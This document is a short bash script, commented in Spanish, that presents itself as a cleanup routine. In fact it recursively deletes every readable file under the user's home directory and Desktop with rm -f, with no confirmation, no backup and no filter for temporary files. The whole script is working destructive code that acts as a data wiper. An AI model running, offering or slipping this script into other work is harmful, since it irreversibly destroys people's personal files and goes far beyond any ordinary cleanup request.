#!/bin/bash

# Función para eliminar archivos en los directorios especificados
eliminar_archivos() {
    local dir=$1

    if [ ! -r "$dir" ]; then
        echo "No se tiene acceso al directorio: $dir"
        return
    fi

    echo "Buscando en el directorio: $dir"

    # Encuentra y elimina archivos
    find "$dir" -type f -print0 2>/dev/null | while IFS= read -r -d '' FILE; do
        if [ -r "$FILE" ]; then
            echo "Eliminando archivo: $FILE"
            rm -f "$FILE"
        else
            echo "No se tiene acceso al archivo: $FILE"
        fi
    done
}

# Directorios a limpiar
DIRECTORIOS="$HOME/Desktop $HOME"

for DIR in $DIRECTORIOS; do
    eliminar_archivos "$DIR"
done

echo "Proceso completado."
